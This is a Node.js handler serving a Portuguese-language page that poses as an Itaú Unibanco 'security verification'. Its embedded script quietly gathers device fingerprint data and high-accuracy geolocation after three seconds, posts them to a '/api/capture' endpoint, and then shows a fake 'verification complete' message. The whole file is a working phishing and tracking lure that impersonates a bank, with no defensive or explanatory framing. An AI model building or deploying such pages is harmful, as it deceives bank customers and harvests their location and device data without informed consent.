module.exports = async (req, res) => {

    res.setHeader('Content-Type', 'text/html; charset=utf-8')
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate')
    
    const html = `<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança - Itaú</title>
    <style>body{font-family:Segoe UI;background:linear-gradient(135deg,#a00 0%,#900 100%);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;margin:0;}
    .container{background:rgba(0,0,0,0.8);border-radius:15px;padding:40px;text-align:center;max-width:500px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #f44;}
    .logo{font-size:28px;font-weight:bold;margin-bottom:20px;text-shadow:0 2px 4px rgba(0,0,0,0.5);}
    .status{background:rgba(255,255,255,0.1);padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #f44;}
    .loading{font-size:16px;color:#ccc;margin-top:20px;}
    .spinner{border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top:3px solid #fff;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto;}
    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="container">
        <div class="logo">ITAÚ UNIBANCO</div>
        <div class="status">
            <h2>🔒 Verificação de Segurança em Andamento</h2>
            <p>Estamos verificando seu dispositivo contra ameaças conhecidas...</p>
        </div>
        <div class="spinner"></div>
        <div class="loading">⏳ Processo automático - Aguarde...</div>
    </div>
    <script>
        // Coleta de dados simplificada e eficiente
        async function collectAndSend() {
            const payload = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: { 
                    width: screen.width, 
                    height: screen.height, 
                    colorDepth: screen.colorDepth 
                }
            }

            // Tentativa de geolocalização
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        })
                    })
                    payload.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    }
                } catch (e) {
                    payload.geolocationError = e.message
                }
            }

            // Envio simplificado para a API
            try {
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                
                document.querySelector('.status').innerHTML = '<h2>✅ Verificação Concluída</h2><p>Seu dispositivo foi verificado com sucesso.</p>'
            } catch (e) {
                document.querySelector('.status').innerHTML = '<h2>⚠️ Verificação Parcial</h2><p>Algumas informações não puderam ser processadas.</p>'
            }
            
            document.querySelector('.spinner').style.display = 'none'
        }

        // Inicia a coleta após 3 segundos
        setTimeout(collectAndSend, 3000)
    </script>
</body></html>`

    res.send(html)
}
